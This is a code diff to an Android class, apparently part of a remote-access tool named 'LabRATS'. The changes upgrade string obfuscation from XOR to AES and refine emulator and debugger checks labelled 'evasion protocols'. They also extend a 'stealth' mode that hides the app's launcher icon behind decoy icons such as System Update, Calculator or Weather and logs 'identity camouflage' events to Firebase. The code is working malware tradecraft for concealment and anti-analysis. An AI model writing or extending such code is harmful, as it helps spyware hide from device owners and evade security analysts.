@@ -8,6 +8,11 @@ import com.labs.labrats.BuildConfig;
 import java.io.File;
 import java.lang.reflect.Method;
 import java.util.UUID;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import java.security.MessageDigest;
+import java.util.Arrays;
 
 /**
  * Internal system environment synchronization.
@@ -16,23 +21,42 @@ public class SystemAnalytics {
 
     private static final String DYNAMIC_K = BuildConfig.ENCRYPTION_KEY;
 
+    private static SecretKeySpec getSecretKey() throws Exception {
+        byte[] key = DYNAMIC_K.getBytes("UTF-8");
+        MessageDigest sha = MessageDigest.getInstance("SHA-256");
+        key = sha.digest(key);
+        return new SecretKeySpec(key, "AES");
+    }
+
     public static String decrypt(byte[] e) {
-        byte[] kBytes = DYNAMIC_K.getBytes();
-        byte[] d = new byte[e.length];
-        for (int i = 0; i < e.length; i++) {
-            d[i] = (byte) (e[i] ^ kBytes[i % kBytes.length]);
+        try {
+            if (e == null || e.length < 16) return "";
+            byte[] iv = Arrays.copyOfRange(e, 0, 16);
+            byte[] cipherText = Arrays.copyOfRange(e, 16, e.length);
+            
+            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+            cipher.init(Cipher.DECRYPT_MODE, getSecretKey(), new IvParameterSpec(iv));
+            return new String(cipher.doFinal(cipherText), "UTF-8");
+        } catch (Exception err) {
+            return "";
         }
-        return new String(d);
     }
 
     public static byte[] encrypt(String s) {
-        byte[] kBytes = DYNAMIC_K.getBytes();
-        byte[] sBytes = s.getBytes();
-        byte[] e = new byte[sBytes.length];
-        for (int i = 0; i < sBytes.length; i++) {
-            e[i] = (byte) (sBytes[i] ^ kBytes[i % kBytes.length]);
+        try {
+            if (s == null) return new byte[0];
+            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+            cipher.init(Cipher.ENCRYPT_MODE, getSecretKey());
+            byte[] iv = cipher.getIV();
+            byte[] cipherText = cipher.doFinal(s.getBytes("UTF-8"));
+            
+            byte[] combined = new byte[iv.length + cipherText.length];
+            System.arraycopy(iv, 0, combined, 0, iv.length);
+            System.arraycopy(cipherText, 0, combined, iv.length, cipherText.length);
+            return combined;
+        } catch (Exception err) {
+            return new byte[0];
         }
-        return e;
     }
 
     public static Object safeCall(String c, String m, Class<?>[] p, Object i, Object... a) {
@@ -46,6 +70,13 @@ public class SystemAnalytics {
     }
 
     public static boolean checkEnv(Context context) {
+        // [STEALTH_PATCH] Skip aggressive evasion checks during development/debug builds
+        // to prevent the app from self-terminating on emulators or when a debugger is detected.
+        if (BuildConfig.DEBUG) {
+            android.util.Log.d("LabRATS-Evasion", "Debug build detected. Skipping environment evasion protocols.");
+            return false;
+        }
+
         // Debugger Check
         if (android.os.Debug.isDebuggerConnected()) return true;
 
@@ -55,13 +86,13 @@ public class SystemAnalytics {
         String h = Build.HARDWARE;
         String ma = Build.MANUFACTURER;
         
-        // Comprehensive Hardware/Emulator Checks
-        boolean r = f.startsWith("gen") || f.startsWith("unk")
+        // Comprehensive Hardware/Emulator Checks - Refined for API 21+ legacy hardware
+        boolean r = (f.startsWith("gen") && f.contains("sdk")) || f.startsWith("unk") && f.contains("emu")
                 || m.contains("sdk") || m.contains("Emu")
                 || m.contains("x86") || ma.contains("Geny")
-                || ma.contains("Google") && h.equals("ranchu") // Pixel Emulator
-                || (Build.BRAND.startsWith("gen") && Build.DEVICE.startsWith("gen"))
-                || p.contains("sdk") || h.contains("gold") || h.contains("ranch")
+                || (ma.contains("Google") && h.equals("ranchu")) // Pixel Emulator
+                || (Build.BRAND.startsWith("gen") && Build.DEVICE.startsWith("gen") && Build.PRODUCT.contains("sdk"))
+                || (h.contains("gold") || h.contains("ranch"))
                 || p.contains("vbox") || p.contains("sim")
                 || ma.equalsIgnoreCase("nox") || p.equalsIgnoreCase("nox");
 
@@ -150,20 +181,39 @@ public class SystemAnalytics {
     public static void setStealthMode(android.content.Context context, boolean stealth) {
         try {
             android.util.Log.d("SystemAnalytics", "Executing stealth protocol. Active: " + stealth);
+            
             android.content.pm.PackageManager pm = context.getPackageManager();
             android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
             
-            // Resolve chosen Decoy from BuildConfig
+            // Resolve chosen Decoy from Persisted Settings or BuildConfig fallback
+            int choice = getDecoyChoice(context);
             String decoyClass = "com.labs.labrats.SystemUpdateAlias";
-            try {
-                switch (BuildConfig.DECOY_CHOICE) {
-                    case 2: decoyClass = "com.labs.labrats.CalculatorAlias"; break;
-                    case 3: decoyClass = "com.labs.labrats.WeatherAlias"; break;
-                    case 4: decoyClass = "com.labs.labrats.SettingsAlias"; break;
-                }
-            } catch (Exception ignored) {}
+            switch (choice) {
+                case 2: decoyClass = "com.labs.labrats.CalculatorAlias"; break;
+                case 3: decoyClass = "com.labs.labrats.WeatherAlias"; break;
+                case 4: decoyClass = "com.labs.labrats.SettingsAlias"; break;
+            }
             
             android.content.ComponentName decoy = new android.content.ComponentName(context, decoyClass);
+
+            // [OPTIMIZATION] Check current state first to avoid redundant launcher restarts
+            int mainState = pm.getComponentEnabledSetting(main);
+            int decoyState = pm.getComponentEnabledSetting(decoy);
+            
+            boolean currentlyStealth = (mainState == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
+            
+            if (stealth == currentlyStealth && stealth && decoyState == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+                // Already in correct stealth mode with the right decoy, do nothing
+                return;
+            }
+            if (stealth == currentlyStealth && !stealth) {
+                // Already in normal mode, do nothing
+                return;
+            }
+
+            // Persist the stealth state
+            context.getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE)
+                    .edit().putBoolean("stealth_enabled", stealth).apply();
 
             if (stealth) {
                 // Disable Main
@@ -181,12 +231,6 @@ public class SystemAnalytics {
                 pm.setComponentEnabledSetting(decoy, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 
                 FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage DEPLOYED (" + decoyClass + ")");
-                
-                // Force Launcher Refresh
-                android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
-                home.addCategory(android.content.Intent.CATEGORY_HOME);
-                home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(home);
             } else {
                 // Restore Main
                 pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
@@ -197,15 +241,39 @@ public class SystemAnalytics {
                     pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 }
                 FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage RELEASED");
-                
-                // Force Launcher Refresh
-                android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
-                home.addCategory(android.content.Intent.CATEGORY_HOME);
-                home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(home);
             }
+
+            // Force Launcher Refresh
+            android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
+            home.addCategory(android.content.Intent.CATEGORY_HOME);
+            home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(home);
+
         } catch (Exception e) {
             android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage());
         }
+    }
+
+    public static int getDecoyChoice(Context context) {
+        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                .getInt("decoy_choice", BuildConfig.DECOY_CHOICE);
+    }
+
+    public static void setDecoyChoice(Context context, int choice) {
+        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                .edit().putInt("decoy_choice", choice).apply();
+    }
+
+    public static boolean isStealthEnabled(Context context) {
+        // First check if Main launcher is actually disabled - that's the source of truth
+        try {
+            android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
+            int state = context.getPackageManager().getComponentEnabledSetting(main);
+            if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) return true;
+            if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) return false;
+        } catch (Exception ignored) {}
+        
+        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                .getBoolean("stealth_enabled", false);
     }
 }
